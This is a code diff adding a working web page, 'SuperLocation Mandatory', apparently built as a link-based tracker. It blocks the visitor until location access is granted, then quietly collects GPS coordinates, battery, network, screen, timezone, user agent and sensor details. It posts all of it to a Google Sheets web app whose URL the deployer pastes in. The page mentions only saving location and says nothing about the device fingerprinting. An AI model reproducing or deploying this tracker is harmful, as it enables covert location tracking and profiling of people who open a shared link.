@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SuperLocation Mandatory</title>
+  <style>
+    body{
+      font-family: Arial, sans-serif;
+      background:#0b1220;
+      color:white;
+      margin:0;
+      padding:18px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+    }
+    .box{
+      width:95%;
+      max-width:520px;
+      background:#111a2e;
+      padding:22px;
+      border-radius:18px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.45);
+      text-align:center;
+    }
+    h2{margin:0 0 10px;font-size:22px;}
+    .msg{
+      margin-top:14px;
+      font-size:16px;
+      line-height:1.6;
+      opacity:0.95;
+    }
+    .pill{
+      display:inline-block;
+      padding:8px 12px;
+      border-radius:999px;
+      background:rgba(255,255,255,0.08);
+      margin-top:12px;
+      font-size:14px;
+    }
+    .ok{
+      background:rgba(34,197,94,0.18);
+      border:1px solid rgba(34,197,94,0.35);
+    }
+    .wait{
+      background:rgba(245,158,11,0.15);
+      border:1px solid rgba(245,158,11,0.30);
+    }
+    .bad{
+      background:rgba(239,68,68,0.15);
+      border:1px solid rgba(239,68,68,0.30);
+    }
+    .small{
+      font-size:12px;
+      opacity:0.75;
+      margin-top:10px;
+    }
+    button{
+      width:100%;
+      padding:14px;
+      border:none;
+      border-radius:12px;
+      font-size:16px;
+      font-weight:bold;
+      cursor:pointer;
+      margin-top:16px;
+      background:#22c55e;
+      color:#07140c;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>📍 SuperLocation</h2>
+  <div id="status" class="pill wait">⏳ Waiting for Location...</div>
+  <div class="msg" id="msg">कृपया Location Allow करें, तभी आगे चलेगा।</div>
+  <div class="small" id="small">Location Allow होते ही data auto Google Sheet में save होगा।</div>
+
+  <button id="retryBtn" style="display:none;" onclick="retry()">🔄 Try Again</button>
+</div>
+
+<script>
+  // 🔥 IMPORTANT:
+  // यहां अपना Google Apps Script WebApp URL डालें:
+  const SHEET_WEBAPP_URL = "PASTE_YOUR_WEBAPP_URL_HERE";
+
+  let mapUrl = "";
+  let collected = {};
+
+  function nowString(){
+    const d = new Date();
+    return d.toLocaleString();
+  }
+
+  function setUI(type, statusText, message, small=""){
+    const st = document.getElementById("status");
+    st.className = "pill " + type;
+    st.innerText = statusText;
+
+    document.getElementById("msg").innerText = message;
+    document.getElementById("small").innerText = small;
+  }
+
+  function showRetry(){
+    document.getElementById("retryBtn").style.display = "block";
+  }
+
+  function hideRetry(){
+    document.getElementById("retryBtn").style.display = "none";
+  }
+
+  function getBasicInfo(){
+    const ua = navigator.userAgent;
+    const platform = navigator.platform || "Unknown";
+    const lang = navigator.language || "Unknown";
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+
+    const screenW = screen.width;
+    const screenH = screen.height;
+    const pixelRatio = window.devicePixelRatio || 1;
+
+    const touch = ("ontouchstart" in window) ? "Yes" : "No";
+    const darkMode = (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? "Yes" : "No";
+
+    return {
+      ua, platform, lang, tz,
+      screenW, screenH, pixelRatio,
+      touch, darkMode
+    };
+  }
+
+  function getNetworkInfo(){
+    let online = navigator.onLine ? "Yes" : "No";
+    let connType = "Not Supported";
+    let downlink = "Not Supported";
+
+    if(navigator.connection){
+      connType = navigator.connection.effectiveType || "Unknown";
+      downlink = navigator.connection.downlink ? (navigator.connection.downlink + " Mbps") : "Unknown";
+    }
+
+    return { online, connType, downlink };
+  }
+
+  async function getBatteryInfo(){
+    try{
+      if(navigator.getBattery){
+        const b = await navigator.getBattery();
+        return {
+          supported: true,
+          level: Math.round(b.level * 100) + "%",
+          charging: b.charging ? "Yes" : "No"
+        };
+      }else{
+        return { supported:false };
+      }
+    }catch(e){
+      return { supported:false };
+    }
+  }
+
+  function getSensorSupport(){
+    return {
+      accelerometer: ("DeviceMotionEvent" in window) ? "Supported" : "Not Supported",
+      gyroscope: ("DeviceOrientationEvent" in window) ? "Supported" : "Not Supported"
+    };
+  }
+
+  function getLocationMandatory(){
+    return new Promise((resolve) => {
+      if(!navigator.geolocation){
+        resolve({ ok:false, reason:"Not Supported" });
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          const acc = pos.coords.accuracy;
+
+          const speed = (pos.coords.speed === null || pos.coords.speed === undefined) ? "" : pos.coords.speed;
+          const altitude = (pos.coords.altitude === null || pos.coords.altitude === undefined) ? "" : pos.coords.altitude;
+
+          mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+          resolve({
+            ok:true,
+            lat, lon, acc, speed, altitude
+          });
+        },
+        (err) => {
+          resolve({
+            ok:false,
+            reason: (err.code === 1) ? "Permission Denied" : "Location Error"
+          });
+        },
+        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+      );
+    });
+  }
+
+  async function run(){
+    hideRetry();
+    setUI("wait", "⏳ Requesting Location...", "कृपया Location Allow करें।", "");
+
+    // 1) First: Location mandatory
+    const loc = await getLocationMandatory();
+
+    if(!loc.ok){
+      if(loc.reason === "Permission Denied"){
+        setUI("bad", "❌ Location Denied", "Location Allow किए बिना आगे नहीं चलेगा।", "Browser settings में जाकर Location Allow करें फिर Try Again दबाएँ।");
+      }else{
+        setUI("bad", "❌ Location Error", "Location नहीं मिल रहा।", "GPS ON करें और फिर Try Again दबाएँ।");
+      }
+      showRetry();
+      return; // STOP here (no save)
+    }
+
+    setUI("wait", "⏳ Fetching Info...", "Location मिल गया, अब save हो रहा है...", "");
+
+    // 2) Collect remaining info
+    const basic = getBasicInfo();
+    const net = getNetworkInfo();
+    const battery = await getBatteryInfo();
+    const sensors = getSensorSupport();
+
+    collected = {
+      time: nowString(),
+      // location
+      latitude: loc.lat,
+      longitude: loc.lon,
+      accuracy: loc.acc + " meters",
+      speed: loc.speed,
+      altitude: loc.altitude,
+      maps: mapUrl,
+      // battery
+      battery: (battery.supported ? battery.level : "Not Supported"),
+      charging: (battery.supported ? battery.charging : ""),
+      // network
+      online: net.online,
+      connection: net.connType,
+      downlink: net.downlink,
+      // device
+      platform: basic.platform,
+      language: basic.lang,
+      timezone: basic.tz,
+      screen: basic.screenW + " x " + basic.screenH,
+      pixelRatio: basic.pixelRatio,
+      touch: basic.touch,
+      darkMode: basic.darkMode,
+      userAgent: basic.ua,
+      // sensors
+      accelerometer: sensors.accelerometer,
+      gyroscope: sensors.gyroscope
+    };
+
+    // 3) Save to sheet
+    if(!SHEET_WEBAPP_URL || SHEET_WEBAPP_URL.includes("PASTE_YOUR_WEBAPP_URL_HERE")){
+      setUI("bad", "❌ Error", "WebApp URL set नहीं है।", "HTML code में SHEET_WEBAPP_URL paste करें।");
+      showRetry();
+      return;
+    }
+
+    setUI("wait", "⏳ Saving...", "Data save हो रहा है...", "");
+
+    try{
+      await fetch(SHEET_WEBAPP_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(collected)
+      });
+
+      // Final success screen
+      setUI("ok", "✅ Success", "Data saved Successfully", "");
+    }catch(err){
+      setUI("bad", "❌ Failed", "Data save नहीं हुआ।", "Internet ON करें या WebApp URL check करें।");
+      showRetry();
+    }
+  }
+
+  function retry(){
+    run();
+  }
+
+  window.addEventListener("load", () => {
+    run();
+  });
+</script>
+
+</body>
+</html>
